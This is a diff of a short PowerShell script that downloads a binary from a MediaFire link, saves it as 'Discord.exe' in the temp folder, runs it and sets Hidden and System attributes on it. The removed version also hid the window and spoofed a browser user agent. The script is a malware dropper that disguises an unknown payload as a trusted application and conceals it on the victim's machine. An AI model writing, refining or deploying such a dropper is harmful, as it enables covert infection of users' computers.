@@ -1,13 +1,39 @@
-$url = "https://download848.mediafire.com/4m8rkjdgqlkg0ZqgoR9Xd17dzOFhamKaSqeqdSM7V0E8mIYMc5rlpdf7df2qaGu0RDqfkrSlQ_Tgl1B5jdmD0xKWhkc2Ao8IUG3rS39cTisvnzZaj7hGEy9SOAMOJGLQ8rrO5QkQbovDrbxjrbFnkJLr48AOOG-KdpONI5c9G0tv/s1mnyv77ws4fr7x/asdadadadasdad.bin" # ใส่ URL ของคุณ
+
+$url = "https://download848.mediafire.com/4m8rkjdgqlkg0ZqgoR9Xd17dzOFhamKaSqeqdSM7V0E8mIYMc5rlpdf7df2qaGu0RDqfkrSlQ_Tgl1B5jdmD0xKWhkc2Ao8IUG3rS39cTisvnzZaj7hGEy9SOAMOJGLQ8rrO5QkQbovDrbxjrbFnkJLr48AOOG-KdpONI5c9G0tv/s1mnyv77ws4fr7x/asdadadadasdad.bin" 
+
 $dest = "$env:TEMP\Discord.exe"
 
+
+
 try {
-    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-    Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent $ua -UseBasicParsing -ErrorAction SilentlyContinue
+
+
+
+    Invoke-WebRequest -Uri $url -OutFile $dest
+
+
+
+
+
+    Start-Process -FilePath $dest -Wait
+
+
+
+
 
     if (Test-Path $dest) {
+
         Set-ItemProperty -Path $dest -Name Attributes -Value ([System.IO.FileAttributes]::Archive -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
-        Start-Process -FilePath $dest -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
+
+        Write-Host "File secured and hidden."
+
     }
+
 }
-catch { }
+
+catch {
+
+    Write-Error "An error occurred: $_"
+
+}
+
